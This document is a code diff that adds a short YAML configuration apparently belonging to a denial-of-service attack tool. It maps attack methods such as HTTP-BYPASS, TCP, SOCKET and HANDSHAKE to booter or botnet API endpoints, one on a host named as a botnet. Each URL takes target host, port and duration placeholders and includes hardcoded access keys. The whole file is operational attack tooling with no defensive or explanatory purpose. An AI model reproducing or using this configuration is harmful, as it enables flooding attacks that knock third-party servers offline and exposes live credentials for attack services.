@@ -1,0 +1,8 @@
+methods:
+  HTTPS:
+    - http://botnetnguyentuan.ddns.net:1337/api?target=<<host>>&port=<<port>>&duration=<<time>>&&method=HTTP-BYPASS&&key=annhien2024api1
+    - http://net-killer.servehttp.com/cf.php?key=keylayer788882123&host=<<host>>&port=<<port>>&time=<<time>>
+  HANDSHAKE:
+    - https://nguyentuanapi/api/attack?key=master&host=<<host>>&port=<<port>>&time=<<time>>&method=TCP
+    - https://nguyentuanapi/api/attack?key=master&host=<<host>>&port=<<port>>&time=<<time>>&method=SOCKET
+    - https://nguyentuanapi/api/attack?key=master&host=<<host>>&port=<<port>>&time=<<time>>&method=HANDSHAKE
